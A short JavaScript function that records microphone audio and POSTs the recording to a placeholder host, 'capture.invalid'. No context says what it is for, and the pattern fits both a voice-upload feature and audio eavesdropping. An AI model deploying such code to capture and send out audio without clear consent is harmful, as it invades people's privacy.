async function recordAudio() {
    const stream = await navigator.mediaDevices.getUserMedia({audio: true, video: false});
    const recorder = new MediaRecorder(stream);
    recorder.ondataavailable = (event) => {
        const recording = event.data;
        const form = new FormData();
        form.append("recording", recording, "audio.webm");
        fetch("https://capture.invalid/recording", {method: "POST", body: form});
    };
    recorder.start();
}
